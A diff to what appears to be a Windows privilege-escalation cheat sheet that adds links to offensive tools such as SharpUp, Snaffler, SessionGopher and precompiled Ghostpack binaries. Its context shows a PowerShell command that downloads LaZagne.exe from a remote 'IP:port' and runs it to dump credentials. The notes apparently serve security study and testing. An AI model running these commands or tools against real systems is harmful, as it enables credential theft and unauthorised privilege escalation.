@@ -145,6 +145,7 @@ Additional references
 * [LOLBAS](https://lolbas-project.github.io/#) <small>(6.3k ⭐)</small> 
 * [hijacklibs](https://hijacklibs.net/) <small>(0.5k ⭐)</small>
 * [frizb](https://github.com/frizb/Windows-Privilege-Escalation) <small>(0.7k ⭐, checklist, 2020 🪦)</small>
+* [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) <small>(1.0k ⭐, 2022 🪦)</small>
 </div><div>
 
 There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...
@@ -153,6 +154,7 @@ There are many **automated scripts** that will investigate usual places, service
 * [Seatbelt](https://github.com/GhostPack/Seatbelt) <small>(3.4k ⭐)</small>
 * [PrivescCheck](https://github.com/itm4n/PrivescCheck) <small>(2.5k ⭐ | powershell script)</small>
 * [JAWS](https://github.com/411Hall/JAWS) <small>(1.5k ⭐ | 2020 🪦)</small>
+* [SharpUp](https://github.com/GhostPack/SharpUp) <small>(1.1k ⭐ | C# port of PowerUp)</small>
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) <small>(11.2k ⭐ | powershell script | 2017 🪦 | This is the latest version of [PowerTools](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) and [PowerUp](https://github.com/HarmJ0y/PowerUp) which are dead too since 2014/2015)</small>.
 
 ```ps
@@ -281,6 +283,10 @@ You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.0k ⭐)<
 PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
 PS> .\LaZagne.exe all
 ```
+
+You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small>.
+
+You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.1k ⭐, 2018 🪦)</small>.
 </div></div>
 
 <hr class="sep-both">
